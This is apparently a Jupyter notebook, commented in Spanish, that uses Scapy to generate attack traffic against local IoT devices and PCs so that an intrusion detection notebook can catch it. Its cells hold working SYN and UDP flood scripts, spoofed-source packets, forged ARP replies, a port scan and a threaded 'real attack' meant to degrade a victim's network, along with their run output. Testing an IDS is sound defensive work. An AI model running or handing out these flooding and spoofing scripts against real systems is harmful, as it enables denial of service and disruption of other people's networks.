In [11]:
from scapy.all import IP, TCP, UDP, send
import time

# ── CONFIGURACIÓN ─────────────────────────────────────────────
IP_ALEXA   = "192.168.0.21"
IP_VICTIMA = "192.168.0.38"

# ── MENÚ DE ATAQUES ───────────────────────────────────────────
print("="*50)
print("  SIMULADOR DE ATAQUES IoT")
print("="*50)
print("\nTipos de ataque disponibles:")
print("  1 — DoS SYN Flood     (muchas conexiones TCP)")
print("  2 — UDP Flood         (inundación UDP)")
print("  3 — Port Scan         (reconocimiento)")
print("  4 — ARP Poisoning     (envenenamiento ARP)")
print("  5 — Slowloris         (ataque lento HTTP)")
print()

tipo = input("Elige tipo de ataque (1-5): ")
intensidad = input("Intensidad (1=baja, 2=media, 3=alta): ")

velocidad = {'1': 0.1, '2': 0.05, '3': 0.01}.get(intensidad, 0.05)
cantidad  = {'1': 50,  '2': 200,  '3': 500 }.get(intensidad, 200)

print(f"\nLanzando ataque tipo {tipo} "
      f"({cantidad} paquetes a {1/velocidad:.0f}/s)\n")

time.sleep(2)

if tipo == '1':
    # DoS SYN Flood
    print("DoS SYN Flood desde IP de Alexa →", IP_VICTIMA)
    for i in range(cantidad):
        pkt = IP(src=IP_ALEXA, dst=IP_VICTIMA) / \
              TCP(sport=5684, dport=80, flags="S")
        send(pkt, verbose=0)
        if i % (cantidad//5) == 0:
            print(f"  {i+1}/{cantidad} paquetes enviados")
        time.sleep(velocidad)

elif tipo == '2':
    # UDP Flood
    print("UDP Flood desde IP de Alexa →", IP_VICTIMA)
    for i in range(cantidad):
        pkt = IP(src=IP_ALEXA, dst=IP_VICTIMA) / \
              UDP(sport=5684, dport=53, 
                  ) / (b"X" * 512)
        send(pkt, verbose=0)
        if i % (cantidad//5) == 0:
            print(f"  {i+1}/{cantidad} paquetes enviados")
        time.sleep(velocidad)

elif tipo == '3':
    # Port Scan (Reconocimiento)
    print("Port Scan desde IP de Alexa →", IP_VICTIMA)
    puertos = [22, 23, 25, 80, 443, 3306, 5432,
               8080, 8443, 1883, 5683]
    for puerto in puertos:
        for _ in range(10):
            pkt = IP(src=IP_ALEXA, dst=IP_VICTIMA) / \
                  TCP(sport=5684, dport=puerto, flags="S")
            send(pkt, verbose=0)
            time.sleep(velocidad)
        print(f"  Puerto {puerto} escaneado")

elif tipo == '4':
    # ARP Poisoning
    from scapy.all import ARP, Ether
    print("ARP Poisoning en la red")
    for i in range(cantidad):
        pkt = Ether(dst="ff:ff:ff:ff:ff:ff") / \
              ARP(op=2,
                  psrc=IP_ALEXA,
                  pdst=IP_VICTIMA,
                  hwsrc="00:00:00:00:00:00")
        send(pkt, verbose=0)
        if i % (cantidad//5) == 0:
            print(f"  {i+1}/{cantidad} paquetes ARP enviados")
        time.sleep(velocidad)

elif tipo == '5':
    # Slowloris — muchas conexiones TCP lentas
    print("Slowloris desde IP de Alexa →", IP_VICTIMA)
    for i in range(cantidad):
        pkt = IP(src=IP_ALEXA, dst=IP_VICTIMA) / \
              TCP(sport=5684+i, dport=80, flags="S")
        send(pkt, verbose=0)
        if i % (cantidad//5) == 0:
            print(f"  {i+1}/{cantidad} conexiones abiertas")
        time.sleep(velocidad * 3)  # más lento

print(f"\n✓ Ataque completado")
print("Revisa el IDS en testeo_de_anomalia.ipynb")

  SIMULADOR DE ATAQUES IoT

Tipos de ataque disponibles:
  1 — DoS SYN Flood     (muchas conexiones TCP)
  2 — UDP Flood         (inundación UDP)
  3 — Port Scan         (reconocimiento)
  4 — ARP Poisoning     (envenenamiento ARP)
  5 — Slowloris         (ataque lento HTTP)


Lanzando ataque tipo 5 (500 paquetes a 100/s)

Slowloris desde IP de Alexa → 192.168.0.38
  1/500 conexiones abiertas
  101/500 conexiones abiertas
  201/500 conexiones abiertas
  301/500 conexiones abiertas
  401/500 conexiones abiertas

✓ Ataque completado
Revisa el IDS en testeo_de_anomalia.ipynb


In [ ]:
#ataque a alexa 
from scapy.all import IP, TCP, send
import time

IP_MI_PC   = "192.168.0.21"
IP_ALEXA   = "192.168.0.38"  # víctima real

print("="*50)
print("  ATAQUE DIRECTO → AMAZON ALEXA")
print(f"  Atacante: {IP_MI_PC} (tu MSI)")
print(f"  Víctima:  {IP_ALEXA} (Alexa real)")
print("="*50)

# Fase 1 — esperar que el IDS esté listo
print("\n[*] Esperando 5s para que el IDS esté listo...")
time.sleep(5)

# Fase 2 — tráfico normal simulado
print("[*] Fase 1 — Tráfico normal (8 segundos)\n")
for i in range(8):
    pkt = IP(src=IP_MI_PC, dst=IP_ALEXA) / \
          TCP(sport=10000, dport=443, flags="S")
    send(pkt, verbose=0)
    print(f"  Paquete normal #{i+1} → Alexa")
    time.sleep(1)

# Fase 3 — DoS SYN Flood hacia Alexa
print("\n[🔴] Fase 2 — DoS SYN Flood hacia Alexa (15s)\n")
for i in range(300):
    pkt = IP(src=IP_MI_PC, dst=IP_ALEXA) / \
          TCP(sport=10000+i, dport=443, flags="S")
    send(pkt, verbose=0)
    if i % 50 == 0:
        print(f"  {i+1}/300 paquetes enviados hacia Alexa")
    time.sleep(0.05)

# Fase 4 — regreso a normal
print("\n[*] Fase 3 — Regreso a normal (8 segundos)\n")
for i in range(8):
    pkt = IP(src=IP_MI_PC, dst=IP_ALEXA) / \
          TCP(sport=10000, dport=443, flags="S")
    send(pkt, verbose=0)
    print(f"  Paquete normal #{i+1} → Alexa")
    time.sleep(1)

print("\n✓ Simulación terminada")
print("Revisa las alertas en testeo_de_anomalia.ipynb")

  ATAQUE DIRECTO → AMAZON ALEXA
  Atacante: 192.168.0.21 (tu MSI)
  Víctima:  192.168.0.38 (Alexa real)

[*] Esperando 5s para que el IDS esté listo...
[*] Fase 1 — Tráfico normal (8 segundos)



  Paquete normal #1 → Alexa


  Paquete normal #2 → Alexa


  Paquete normal #3 → Alexa


  Paquete normal #4 → Alexa


  Paquete normal #5 → Alexa


  Paquete normal #6 → Alexa


  Paquete normal #7 → Alexa


  Paquete normal #8 → Alexa

[🔴] Fase 2 — DoS SYN Flood hacia Alexa (15s)



  1/300 paquetes enviados hacia Alexa


In [19]:
from scapy.all import IP, TCP, UDP, send, sendp, Ether
from datetime import datetime
import threading
import time

IP_MI_PC  = "192.168.0.4"  # tu MSI
IP_VICTIMA = "10.8.9.113"  # la otra PC

print("="*55)
print("  ATAQUE REAL — Afecta rendimiento de red")
print(f"  Atacante: {IP_MI_PC}")
print(f"  Víctima:  {IP_VICTIMA}")
print("="*55)
print("""
Tipos disponibles:
  1 — SYN Flood masivo     (satura conexiones TCP)
  2 — UDP Flood pesado     (satura ancho de banda)
  3 — Ataque combinado     (SYN + UDP simultáneo) ← más notorio
""")

tipo       = input("Elige (1-3): ")
duracion   = int(input("Duración en segundos (ej: 20): "))

print(f"\n[*] Iniciando en 3 segundos...")
print(f"[*] Mira el monitor de red en la víctima\n")
time.sleep(3)

corriendo = True

def syn_flood():
    i = 0
    while corriendo:
        # SYN a múltiples puertos simultáneamente
        for puerto in [80, 443, 8080, 8443, 3389]:
            pkt = IP(src=IP_MI_PC, dst=IP_VICTIMA) / \
                  TCP(sport=10000+i, 
                      dport=puerto, 
                      flags="S",
                      seq=i*1000)
            send(pkt, verbose=0)
            i += 1

def udp_flood():
    i = 0
    while corriendo:
        # UDP con payload grande — ocupa más ancho de banda
        pkt = IP(src=IP_MI_PC, dst=IP_VICTIMA) / \
              UDP(sport=10000, dport=53) / \
              (b"X" * 1400)  # payload máximo
        send(pkt, verbose=0)
        i += 1

def combinado():
    t1 = threading.Thread(target=syn_flood,  daemon=True)
    t2 = threading.Thread(target=udp_flood,  daemon=True)
    t1.start()
    t2.start()

inicio = datetime.now()
print(f"[🔴] ATAQUE INICIADO — {inicio.strftime('%H:%M:%S')}")
print(f"[🔴] Duracion: {duracion} segundos\n")

# Lanzar ataque
if tipo == '1':
    hilo = threading.Thread(target=syn_flood, daemon=True)
    hilo.start()
elif tipo == '2':
    hilo = threading.Thread(target=udp_flood, daemon=True)
    hilo.start()
elif tipo == '3':
    combinado()

# Contador en tiempo real
for seg in range(duracion):
    time.sleep(1)
    print(f"  [{seg+1:02d}/{duracion}s] Ataque en progreso... "
          f"{'🔴' * min(seg//2+1, 10)}")

# Detener
corriendo = False
time.sleep(1)

fin = datetime.now()
print(f"\n[✓] ATAQUE DETENIDO — {fin.strftime('%H:%M:%S')}")
print(f"[✓] Duración real: "
      f"{(fin-inicio).seconds} segundos")
print(f"\nRevisa el IDS en testeo_de_anomalia.ipynb")

  ATAQUE REAL — Afecta rendimiento de red
  Atacante: 192.168.0.4
  Víctima:  10.8.9.113



Tipos disponibles:
  1 — SYN Flood masivo     (satura conexiones TCP)
  2 — UDP Flood pesado     (satura ancho de banda)
  3 — Ataque combinado     (SYN + UDP simultáneo) ← más notorio


[*] Iniciando en 3 segundos...
[*] Mira el monitor de red en la víctima

[🔴] ATAQUE INICIADO — 14:17:21
[🔴] Duracion: 20 segundos

  [01/20s] Ataque en progreso... 🔴
  [02/20s] Ataque en progreso... 🔴


  [03/20s] Ataque en progreso... 🔴🔴
  [04/20s] Ataque en progreso... 🔴🔴


  [05/20s] Ataque en progreso... 🔴🔴🔴
  [06/20s] Ataque en progreso... 🔴🔴🔴
  [07/20s] Ataque en progreso... 🔴🔴🔴🔴
  [08/20s] Ataque en progreso... 🔴🔴🔴🔴


  [09/20s] Ataque en progreso... 🔴🔴🔴🔴🔴
  [10/20s] Ataque en progreso... 🔴🔴🔴🔴🔴


  [11/20s] Ataque en progreso... 🔴🔴🔴🔴🔴🔴
  [12/20s] Ataque en progreso... 🔴🔴🔴🔴🔴🔴
  [13/20s] Ataque en progreso... 🔴🔴🔴🔴🔴🔴🔴
  [14/20s] Ataque en progreso... 🔴🔴🔴🔴🔴🔴🔴


  [15/20s] Ataque en progreso... 🔴🔴🔴🔴🔴🔴🔴🔴
  [16/20s] Ataque en progreso... 🔴🔴🔴🔴🔴🔴🔴🔴


  [17/20s] Ataque en progreso... 🔴🔴🔴🔴🔴🔴🔴🔴🔴
  [18/20s] Ataque en progreso... 🔴🔴🔴🔴🔴🔴🔴🔴🔴
  [19/20s] Ataque en progreso... 🔴🔴🔴🔴🔴🔴🔴🔴🔴🔴
  [20/20s] Ataque en progreso... 🔴🔴🔴🔴🔴🔴🔴🔴🔴🔴



[✓] ATAQUE DETENIDO — 14:17:42
[✓] Duración real: 21 segundos

Revisa el IDS en testeo_de_anomalia.ipynb


In [ ]:
from scapy.all import IP, TCP, UDP, Ether, send
import threading, time

IP_ATACANTE = "192.168.3.69"
IP_VICTIMA  = "192.168.3.166"
MAC_VICTIMA = "d4:f3:2d:97:96:72"  # ← MAC real confirmada

corriendo = True

def syn_flood():
    i = 0
    while corriendo:
        # Ahora incluye la MAC — sin warnings
        pkt = Ether(dst=MAC_VICTIMA) / \
              IP(src=IP_ATACANTE, dst=IP_VICTIMA) / \
              TCP(sport=1000000+i, dport=80, flags="S")
        send(pkt, verbose=0)
        i += 1

def udp_flood():
    while corriendo:
        pkt = Ether(dst=MAC_VICTIMA) / \
              IP(src=IP_ATACANTE, dst=IP_VICTIMA) / \
              UDP(sport=10000, dport=53) / \
              (b"X" * 1400)
        send(pkt, verbose=0)

print(f"Atacando {IP_VICTIMA} ({MAC_VICTIMA})")
print(f"Sin warnings — paquetes directos\n")

t1 = threading.Thread(target=syn_flood, daemon=True)
t2 = threading.Thread(target=udp_flood, daemon=True)
t1.start()
t2.start()

for s in range(20):
    time.sleep(1)
    print(f"  [{s+1:02d}/20s] 🔴")

corriendo = False
print("\n✓ Ataque terminado")

Atacando 192.168.3.166 (d4:f3:2d:97:96:72)
Sin warnings — paquetes directos



Exception in thread WARNING: MAC address to reach destination not found. Using broadcast.
Thread-17 (syn_flood):
Traceback (most recent call last):
  File "c:\Users\Daniel\anaconda3\Lib\site-packages\scapy\fields.py", line 240, in addfieldWARNING: more MAC address to reach destination not found. Using broadcast.

    return s + self.struct.pack(self.i2m(pkt, val))
               ~~~~~~~~~~~~~~~~^^^^^^^^^^^^^^^^^^^^
struct.error: 'H' format requires 0 <= number <= 65535

During handling of the above exception, another exception occurred:

Traceback (most recent call last):
  File "c:\Users\Daniel\anaconda3\Lib\threading.py", line 1043, in _bootstrap_inner
    self.run()
    ~~~~~~~~^^
  File "c:\Users\Daniel\anaconda3\Lib\site-packages\ipykernel\ipkernel.py", line 772, in run_closure
    _threading_Thread_run(self)
    ~~~~~~~~~~~~~~~~~~~~~^^^^^^
  File "c:\Users\Daniel\anaconda3\Lib\threading.py", line 994, in run
    self._target(*self._args, **self._kwargs)
    ~~~~~~~~~~~~^^^^^^^^^^

  [01/20s] 🔴
  [02/20s] 🔴
  [03/20s] 🔴
  [04/20s] 🔴


  [05/20s] 🔴


  [06/20s] 🔴
  [07/20s] 🔴
  [08/20s] 🔴
  [09/20s] 🔴


  [10/20s] 🔴
  [11/20s] 🔴
  [12/20s] 🔴


KeyboardInterrupt: 